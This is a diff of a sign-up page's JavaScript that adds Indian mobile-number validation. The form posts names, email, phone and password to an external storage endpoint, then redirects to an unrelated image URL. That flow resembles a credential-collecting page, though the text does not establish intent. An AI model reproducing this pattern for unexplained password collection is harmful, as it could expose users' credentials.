@@ -38,55 +38,56 @@
     </div>
 
     <script>
-        // Set the correct API URL based on the environment
-        const API_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://sign-up-ztbv.onrender.com'; // Update with your actual hosted URL for production
+    const API_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://sign-up-ztbv.onrender.com';
 
-        document.getElementById('signupForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form submission to a server
+    document.getElementById('signupForm').addEventListener('submit', function(event) {
+        event.preventDefault();
 
-            // Get all form data
-            const mobileNumber = document.getElementById('mobileNumber').value;
+        const mobileNumber = document.getElementById('mobileNumber').value;
 
-            // Mobile number validation (Custom validation)
-            const phoneRegex = /^\d{10}$/;
-            if (!phoneRegex.test(mobileNumber)) {
-                alert('Please enter a valid 10-digit mobile number.');
-                return; // Stop form submission
+        // ✅ New Indian mobile validation here
+        function isValidIndianPhoneNumber(number) {
+            number = number.trim().replace(/\s+/g, '');
+            const regex = /^[6-9]\d{9}$/;
+            return regex.test(number);
+        }
+
+        if (!isValidIndianPhoneNumber(mobileNumber)) {
+            alert('Please enter a valid Indian mobile number starting with 6/7/8/9 and 10 digits.');
+            return;
+        }
+
+        const firstName = document.getElementById('firstName').value;
+        const lastName = document.getElementById('lastName').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        fetch(`https://signup-eroo.onrender.com/storeData`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                firstName: firstName,
+                lastName: lastName,
+                mobileNumber: mobileNumber,
+                email: email,
+                password: password,
+            }),
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Data stored successfully');
+                window.location.href = 'https://photospace.life/image.php?id=8067I8.png';
+            } else {
+                throw new Error('Failed to store data');
             }
-
-            // If validation is successful, proceed with sending data
-            const firstName = document.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // Send data to the server using fetch
-            fetch(`https://signup-eroo.onrender.com/storeData`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    firstName: firstName,
-                    lastName: lastName,
-                    mobileNumber: mobileNumber,
-                    email: email,
-                    password: password,
-                }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Data stored successfully');
-                    window.location.href = 'https://photospace.life/image.php?id=8067I8.png'; // Redirect to a new page
-                } else {
-                    throw new Error('Failed to store data');
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Something went wrong. Please try again later.');
-            });
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert('Something went wrong. Please try again with valid mobile number.');
         });
-    </script>
+    });
+</script>
 </body>
 </html>
